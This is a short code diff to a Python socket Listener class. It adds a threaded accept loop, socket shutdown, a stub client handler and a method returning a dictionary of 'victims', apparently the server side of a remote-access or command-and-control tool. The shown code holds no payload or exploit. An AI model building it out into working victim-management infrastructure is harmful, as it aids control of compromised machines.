@@ -44,9 +44,35 @@ class Listener:
     def start(self):
         self.sock.listen(10000)
 
+        while True:
+            conn, addr = self.sock.accept()
+
+            cp.pf_info(f'New client: ({addr[0]},{addr[1]})')
+
+            t = threading.Thread(target=self.handler, args=[conn, addr, ])
+            t.daemon = True
+
+            t.start()
+
     def stop(self):
-        pass
+        try:
+            self.sock.close()
+            return True
+        except Exception as ex:
+            return False
 
     def combine_bytes(self, abFirst: bytes, nIdxFirst: int, nLenFirst: int, abSecond: bytes, nIdxSecond: int, nLenSecond: int) -> bytes:
         return abFirst[nIdxFirst:nIdxFirst + nLenFirst] + abSecond[nIdxSecond:nIdxSecond + nLenSecond]
     
+    def handler(self, clnt_sock: socket.socket, clnt_addr):
+        abStaticRecv = b''
+        abDynamicRecv = b''
+
+        clnt = Client(clnt_sock)
+        clnt.addr = clnt_addr
+
+    def get_victims(self) -> dict:
+        return self.dic_victim
+    
+    def set_msg_handler(self, method: object):
+        self.msg_handler = method
